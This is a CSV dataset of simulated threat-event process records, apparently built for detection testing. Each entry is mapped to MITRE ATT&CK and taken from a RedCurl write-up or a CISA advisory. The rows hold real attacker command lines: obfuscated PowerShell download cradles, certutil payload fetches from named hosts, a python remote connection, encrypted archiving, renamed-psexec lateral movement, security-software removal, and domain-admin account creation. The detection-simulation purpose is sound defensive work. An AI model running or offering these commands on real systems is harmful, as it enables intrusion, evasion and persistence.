id,simulation_type,enabled,dest,description,parent_process,process_path,process_name,process,mitre_tactic,mitre_technique,sources,time_delay_seconds
PROC-TE-113,Threat Event,TRUE,WKS113,Proxied Powershell download cradle using mixed casing defense evasion,C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"powershell.exe -c ""$A=[SYStem.neT.WEBrEQueSt]::GEtSYstEMWebpRoXY().GeTpRoXY(‘http://
msn.com’);IF($a.HOST -eQ ‘msn.Com’){(IwR -usEBASIcpARsInG -urI http://woicu.xyz/suayt).tOstRInG()|POWErSHELl.EXe}ELSE{(IWR -usEBaSIcPArsInG -urI http://woicu.xyz/suayt -PRoXy $A -pRoxYuseDe-fauLTcReDENTialS).tOsTRInG()|powErShELL.Exe};""","Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: PowerShell
Command and Scripting Interpreter: Windows Command Shell",https://www.huntress.com/blog/the-hunt-for-redcurl-2,
PROC-TE-114,Threat Event,TRUE,WKS114,Relocated 7zip binary being used to extract encypted payload into ProgramData subdirectory,C:\Windows\System32\cmd.exe,C:\ProgramData\7za.exe,7za.exe,C:\ProgramData\7za.exe x -aoa -pdQEXZCJd revtun3ag.tmp -oC:\ProgramData\ControlsUp,"Execution
Collection","Command and Scripting Interpreter: Windows Command Shell
Data Staged: Local Data Staging",https://www.huntress.com/blog/the-hunt-for-redcurl-2,
PROC-TE-115,Threat Event,TRUE,WKS115,Execution proxying via pcalua.exe to run a python script to initiate a remote connection,C:\Windows\System32\cmd.exe,C:\Windows\System32\pcalua.exe,pcalua.exe,pcalua.exe -a conhost.exe -c --headless C:\ProgramData\ControlsUp\python.exe C:\ProgramData\ControlsUp\cl\cl.py --s 188.130.207.253 --p 10310,"Defense Evasion
Execution","Indirect Command Execution
Command and Scripting Interpreter: Python
Command and Scripting Interpreter: Windows Command Shell",https://www.huntress.com/blog/the-hunt-for-redcurl-2,
PROC-TE-116,Threat Event,TRUE,WKS116,Usage of relocated 7zip binary to archive collected files into a multi-part encrypted archive,C:\Windows\System32\cmd.exe,C:\ProgramData\7za.exe,7za.exe,C:\ProgramData\7za.exe a -pgdxx38a6SVd -mhe=on -v50m -sdel -y temp17000c\abc_rt3_22169.tmp temp1321,"Execution
Collection","Command and Scripting Interpreter: Windows Command Shell
Archive Collected Data",https://www.huntress.com/blog/the-hunt-for-redcurl-2,
PROC-TE-117,Threat Event,TRUE,WKS117,Rare EXE being executed in AppData subdirectory,C:\Windows\System32\cmd.exe,C:\Windows\System32\config\systemprofile\AppData\Local\WCM\mbda76918700ee0725.exe,mbda76918700ee0725.exe,C:\Windows\System32\config\systemprofile\AppData\Local\WCM\mbda76918700ee0725.exe,Execution,Command and Scripting Interpreter: Windows Command Shell,https://www.huntress.com/blog/the-hunt-for-redcurl-2,
PROC-TE-118,Threat Event,TRUE,WKS118,Rare EXE being executed in AppData subdirectory,C:\Windows\System32\cmd.exe,C:\Windows\System32\config\systemprofile\AppData\Local\WCM\nzjetzkuzk.exe,nzjetzkuzk.exe,C:\Windows\System32\config\systemprofile\AppData\Local\WCM\nzjetzkuzk.exe,Execution,Command and Scripting Interpreter: Windows Command Shell,https://www.huntress.com/blog/the-hunt-for-redcurl-2,
PROC-TE-119,Threat Event,TRUE,WKS119,Rare EXE being executed in AppData subdirectory,C:\Windows\System32\cmd.exe,C:\Windows\system32\config\systemprofile\AppData\Local\USB\qpybfa6a97da7711221.exe,qpybfa6a97da7711221.exe,C:\Windows\system32\config\systemprofile\AppData\Local\USB\qpybfa6a97da7711221.exe,Execution,Command and Scripting Interpreter: Windows Command Shell,https://www.huntress.com/blog/the-hunt-for-redcurl-2,
PROC-TE-120,Threat Event,TRUE,WKS120,Rare EXE being executed in subdirectory of ProgramData,C:\Windows\System32\cmd.exe,C:\ProgramData\DiskCleanup\om6db9110b3989a881.exe,om6db9110b3989a881.exe,C:\ProgramData\DiskCleanup\om6db9110b3989a881.exe,Execution,Command and Scripting Interpreter: Windows Command Shell,https://www.huntress.com/blog/the-hunt-for-redcurl-2,
PROC-TE-121,Threat Event,TRUE,WKS121,Cmd.exe calling anomalous .BAT script in subdirectory of ProgramData,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,Cmd.exe /c “C:\ProgramData\DiskCleanup\133ngc.bat”,Execution,Command and Scripting Interpreter: Windows Command Shell,https://www.huntress.com/blog/the-hunt-for-redcurl-2,
PROC-TE-122,Threat Event,TRUE,WKS122,DLL Tool Ingress via Certutil.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\certutil.exe,certutil.exe,certutil -f urlcache https://jxuiay.io/1873.css onedrive.dll,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-123,Threat Event,TRUE,WKS123,MSI Tool Ingress via Certutil.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\certutil.exe,certutil.exe,certutil -f urlcache https://jxuiay.io/1098625.msi onedriveinstaller.msi,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-124,Threat Event,TRUE,WKS124,Enumerate installed drivers with driverquery.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,cmd.exe /c driverquery,"Discovery
Execution","Device Driver Discovery
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-125,Threat Event,TRUE,WKS125,Cmd.exe being used to enumerate environment variables,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,"cmd.exe /c echo Computer: %COMPUTERNAME% & `
echo Username: %USERNAME% & `
echo Domain: %USERDOMAIN% & `
echo Logon Server: %LOGONSERVER% & `
echo DNS Domain: %USERDNSDOMAIN% & `
echo User Profile: %USERPROFILE% & echo `
System Root: %SYSTEMROOT%","Discovery
Execution","System Information Discovery
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-126,Threat Event,TRUE,WKS126,System IP enumeration via ipconfig,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,cmd.exe /c ipconfig /all,"Discovery
Execution","System Information Discovery
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-127,Threat Event,TRUE,WKS127,Enumerate file shares with net.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,cmd.exe /c net share,"Discovery
Execution","Network Share Discovery
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-128,Threat Event,TRUE,WKS128,Enumerate shared files with net.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,cmd.exe /c net use,"Discovery
Execution","Network Share Discovery
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-129,Threat Event,TRUE,WKS129,Enumerate network connections with netstat,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,cmd.exe /c netstat -a,"Discovery
Execution","System Network Connections Discovery
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-130,Threat Event,TRUE,WKS130,Service enumeration with sc.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,cmd.exe /c sc query,"Discovery
Execution","System Service Discovery
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-131,Threat Event,TRUE,WKS131,Enumerate scheduled tasks with schtasks,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,cmd.exe /c schtasks,"Discovery
Execution","System Information Discovery
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-132,Threat Event,TRUE,WKS132,System info recon with systeminfo,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,cmd.exe /c systeminfo,"Discovery
Execution","System Information Discovery
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-133,Threat Event,TRUE,WKS133,System version recon with ver,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,cmd.exe /c ver,"Discovery
Execution","System Information Discovery
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-134,Threat Event,TRUE,WKS134,WMIC printer discovery,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,"cmd.exe /c wmic printer get caption,name,deviceid,drivername,portname","Discovery
Execution","Peripheral Device Discovery
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-135,Threat Event,TRUE,WKS135,WMIC print job discovery,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,cmd.exe /c wmic printjob,"Discovery
Execution","Peripheral Device Discovery
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-136,Threat Event,TRUE,WKS136,Remote system administration via mmc.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\mmc.exe,mmc.exe,mmc.exe compmgmt.msc /computer:10.6.6.2,"Lateral Movement
Execution","Remote Services: Windows Remote Management
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-137,Threat Event,TRUE,WKS137,Remote Desktop (RDP) session creation via mstsc.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\mstsc.exe,mstsc.exe,mstsc.exe /v:10.6.6.2,"Lateral Movement
Execution","Remote Services: Remote Desktop Protocol
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-138,Threat Event,TRUE,WKS138,Remote Desktop (RDP) session creation via mstsc.exe (V2),C:\Windows\System32\cmd.exe,C:\Windows\System32\mstsc.exe,mstsc.exe,mstsc.exe /v:10.6.6.2 /u:patrick /p:St@r123,"Lateral Movement
Execution","Remote Services: Remote Desktop Protocol
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-139,Threat Event,TRUE,WKS139,PowerShell being used to execute base64 encoded command,C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,powershell -exec bypass -enc bgBlAHQAIAB1AHMAZQByAA==,"Defense Evasion
Execution","Obfuscated Files or Information: Command Obfuscation
Command and Scripting Interpreter: PowerShell
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-140,Threat Event,TRUE,WKS140,PowerShell download cradle obfuscated with concatenation,C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,powershell -nop -c $x = 'D' + 'Own' + 'LOa' + 'DfI' + 'le'; Invoke-Expression (New-Object Net.WebClient).$x.Invoke(http://jxuiay.io/tmvr.msi),"Command and Control 
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: PowerShell
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-141,Threat Event,TRUE,WKS141,PowerShell executing compressed and base64 encoded commands,C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"powershell -nop -w hidden -noni -ep bypass &([scriptblock]::create((
New-Object System.IO.StreamReader(
New-Object System.IO.Compression.GzipStream((
New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(
((bgBlAHQAIAB1AHMAZQByAA==)-f'<character replacement 0>',
'<character replacement 1>','<character replacement 2>')))),
[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))","Defense Evasion
Execution","Obfuscated Files or Information: Command Obfuscation
Command and Scripting Interpreter: PowerShell
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-142,Threat Event,TRUE,WKS142,Deletion of PowerShell history file,C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,powershell Remove-Item (Get-PSReadlineOption).HistorySavePath,"Defense Evasion
Execution","Indicator Removal: Clear Command History
Command and Scripting Interpreter: PowerShell
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-143,Threat Event,TRUE,WKS143,Active Directory computer enumeration,C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"powershell Get-ADComputer -Filter * -Property * | Select-Object Name,OperatingSystem,OperatingSystemVersion,Description,LastLogonDate,
logonCount,whenChanged,whenCreated,ipv4Address | Export-CSV -Path C:\Users\Public\a.csv 
-NoTypeInformation -Encoding UTF8","Discovery
Execution","Remote System Discovery
Command and Scripting Interpreter: PowerShell
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-144,Threat Event,TRUE,WKS144,Renamed psexec being used to spawn taskkill on a remote system,C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,"apple.exe -accepteula -nobanner -s \\\\10.0.5.2 ""c:\windows\system32\taskkill.exe"" /f /im WRSA.exe","Lateral Movement
Execution","Remote Services: SMB/Windows Admin Shares
System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-145,Threat Event,TRUE,WKS145,Renamed psexec being used to run a .bat file on a remote system,C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\\\10.0.5.2 -c coba.bat,"Lateral Movement
Execution","Remote Services: SMB/Windows Admin Shares
System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-146,Threat Event,TRUE,WKS146,Renamed psexec being used to run a .bat file on a remote system (v2),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\\\10.0.5.2 -c openrdp.bat,"Lateral Movement
Execution","Remote Services: SMB/Windows Admin Shares
System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-147,Threat Event,TRUE,WKS147,Renamed psexec being used to run a .bat file on a remote system (v3),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\\\10.0.5.2 -c StopAllProcess.bat,"Lateral Movement
Execution","Remote Services: SMB/Windows Admin Shares
System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-148,Threat Event,TRUE,WKS148,Renamed psexec being used to run a .bat file on a remote system (v4),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\\\10.0.5.2 -c zam.bat,"Lateral Movement
Execution","Remote Services: SMB/Windows Admin Shares
System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-149,Threat Event,TRUE,WKS149,Renamed psexec being used to run a .bat file on a remote system (v5),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\\\10.0.5.2 c:\temp\x.bat,"Lateral Movement
Execution","Remote Services: SMB/Windows Admin Shares
System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-150,Threat Event,TRUE,WKS150,Renamed psexec being used to execute cmd.exe on a remote system,C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\\\10.0.5.2 cmd,"Lateral Movement
Execution","Remote Services: SMB/Windows Admin Shares
System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-151,Threat Event,TRUE,WKS151,Renamed psexec being used to run an executable in the root of the C drive on a remote system,C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,"apple.exe -accepteula -nobanner -s \\\\10.0.5.2 cmd /c ""c:\gaze.exe""","Lateral Movement
Execution","Remote Services: SMB/Windows Admin Shares
System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-152,Threat Event,TRUE,WKS152,Renamed psexec being used to copy an executable via SMB share on a remote system,C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,"apple.exe -accepteula -nobanner -s \\\\10.0.5.2 cmd /c ""copy \\\\ad02\sysvol\gaze.exe c:\gaze.exe","Lateral Movement
Execution","Remote Services: SMB/Windows Admin Shares
System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-153,Threat Event,TRUE,WKS153,Renamed psexec being used to copy an executable via SMB share on a remote system and execute it,C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,"apple.exe -accepteula -nobanner -s \\\\10.0.5.2 cmd /c ""copy \\\\ad02\sysvol\gaze.exe c:\gaze.exe && c:\gaze.exe""","Lateral Movement
Execution","Remote Services: SMB/Windows Admin Shares
System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-154,Threat Event,TRUE,WKS154,Renamed psexec being used to run a .bat file on a remote system (v6),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\\\10.0.5.2 -u pam -p jim123 -c coba.bat,"Lateral Movement
Execution","Remote Services: SMB/Windows Admin Shares
System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-155,Threat Event,TRUE,WKS155,Renamed psexec being used to run a .bat file on a remote system (v7),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\\\10.0.5.2 -u pam -p jim123 -c wks155/ipwho.bat,"Lateral Movement
Execution","Remote Services: SMB/Windows Admin Shares
System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-156,Threat Event,TRUE,WKS156,Renamed psexec being used to run a .bat file on a remote system (v8),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\\\10.0.5.2 -u pam -p jim123 -c openrdp.bat,"Lateral Movement
Execution","Remote Services: SMB/Windows Admin Shares
System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-157,Threat Event,TRUE,WKS157,Renamed psexec being used to run a .bat file on a remote system (v9),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\\\10.0.5.2 -u pam -p jim123 -c zam.bat,"Lateral Movement
Execution","Remote Services: SMB/Windows Admin Shares
System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-158,Threat Event,TRUE,WKS158,Renamed psexec being used to execute cmd.exe on a remote system (v2),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\\\10.0.5.2 -u pam -p jim123 cmd,"Lateral Movement
Execution","Remote Services: SMB/Windows Admin Shares
System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-159,Threat Event,TRUE,WKS159,Renamed psexec being used to run a .bat file on a remote system (v10),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\\\10.0.5.2 -u pam -p jim123 -с newuser.bat,"Lateral Movement
Execution","Remote Services: SMB/Windows Admin Shares
System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-160,Threat Event,TRUE,WKS160,Renamed psexec being used to run a .bat file on a remote system (v11),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\\\10.0.5.2 -с duooff.bat,"Lateral Movement
Execution","Remote Services: SMB/Windows Admin Shares
System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-161,Threat Event,TRUE,WKS161,Renamed psexec being used to run a .bat file on a remote system (v12),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\\\10.0.5.2 -с wks161/ipwho.bat,"Lateral Movement
Execution","Remote Services: SMB/Windows Admin Shares
System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-162,Threat Event,TRUE,WKS162,Renamed psexec being used to run a .bat file on a remote system (v13),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\\\10.0.5.2 -с newuser.bat,"Lateral Movement
Execution","Remote Services: SMB/Windows Admin Shares
System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-163,Threat Event,TRUE,WKS163,Renamed psexec being used to run a .bat file on a remote system (v14),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\\\10.0.5.2 -с removesophos.bat,"Lateral Movement
Execution","Remote Services: SMB/Windows Admin Shares
System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-164,Threat Event,TRUE,WKS164,Renamed psexec being used to run a .bat file on a remote system (v15),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\\\10.0.5.2 -с start.bat,"Lateral Movement
Execution","Remote Services: SMB/Windows Admin Shares
System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-165,Threat Event,TRUE,WKS165,Renamed psexec being used to run a .bat file on a remote system (v16),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\\\10.0.5.2 -с uninstallSophos.bat,"Lateral Movement
Execution","Remote Services: SMB/Windows Admin Shares
System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-166,Threat Event,TRUE,WKS166,Domain controller enumeration via nltest.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\nltest.exe,nltest.exe,nltest /dclist:,"Discovery
Execution","Domain Trust Discovery
Remote System Discovery
Command and Scripting Interpreter: PowerShell
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-167,Threat Event,TRUE,WKS167,Enumeration of domain admins with net.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net group ""domain admins"" /domain","Discovery
Execution","Permission Groups Discovery: Domain Groups
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-168,Threat Event,TRUE,WKS168,Addition of a new user to domain admins with net.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net group ""Domain Admins"" default /add /domain","Privilege Escalation
Persistence
Execution","Valid Accounts: Domain Accounts
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-169,Threat Event,TRUE,WKS169,Addition of a new user to Enterprise Admins with net.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net group ""Enterprise Admins"" default /add /domain","Privilege Escalation
Persistence
Execution","Valid Accounts: Domain Accounts
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-170,Threat Event,TRUE,WKS170,Addition of a new user to Remote Desktop Users with net.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net group ""Remote Desktop Users"" default /add /domain","Privilege Escalation
Persistence
Execution","Valid Accounts: Domain Accounts
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-171,Threat Event,TRUE,WKS171,Addition of a new user to Group Policy Creator Owners with net.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net group ""Group Policy Creator Owners"" default /add /domain","Privilege Escalation
Persistence
Execution","Valid Accounts: Domain Accounts
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-172,Threat Event,TRUE,WKS172,Addition of a new user to Schema Admins with net.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net group ""Schema Admins"" default /add /domain","Privilege Escalation
Persistence
Execution","Valid Accounts: Domain Accounts
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-173,Threat Event,TRUE,WKS173,Enumeration of domain users with net.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net group ""domain users"" /domain","Discovery
Execution","Permission Groups Discovery: Domain Groups
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-174,Threat Event,TRUE,WKS174,Activation of newly created domain user with net.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,net user default /active:yes /domain,"Persistence
Execution","Valid Accounts: Local Accounts
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-175,Threat Event,TRUE,WKS175,Creation of new domain user with net.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,net user /add default krustykrabohyeah /domain,"Persistence
Execution","Valid Accounts: Local Accounts
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-176,Threat Event,TRUE,WKS176,User session enumeration with query.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\query.exe,query.exe,query user,"Discovery
Execution","System Owner/User Discovery
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-177,Threat Event,TRUE,WKS177,Enablement of Restricted Admin Mode via reg.exe,C:\Windows\System32\cmd.exe,C:\windows\system32\reg.exe,reg.exe,reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0,"Lateral Movement
Defense Evasion
Execution","Remote Services: Remote Desktop Protocol
Modify Registry
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
PROC-TE-178,Threat Event,TRUE,WKS178,System info recon with systeminfo (v2),C:\Windows\System32\cmd.exe,C:\Windows\System32\systeminfo.exe,systeminfo.exe,systeminfo,"Discovery
Execution","System Information Discovery
Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
